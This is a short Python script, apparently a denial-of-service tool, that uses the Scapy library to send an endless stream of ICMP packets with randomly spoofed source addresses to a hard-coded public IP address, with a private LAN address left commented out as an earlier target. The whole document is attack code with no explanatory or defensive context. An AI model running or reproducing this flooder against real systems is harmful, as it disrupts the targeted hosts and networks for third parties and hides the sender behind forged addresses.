#!/usr/bin/env python3

from scapy.all import *
import sys

#ip = RandIP()._fix()
#mac = RandMAC()._fix()
while True:
    #p = IP(src=RandIP()._fix(), dst="192.168.1.37")/ICMP()
    p = IP(src=RandIP()._fix(), dst="159.253.56.69")/ICMP()
    p.display
    sendp(p, inter=0.01, count=9999999)
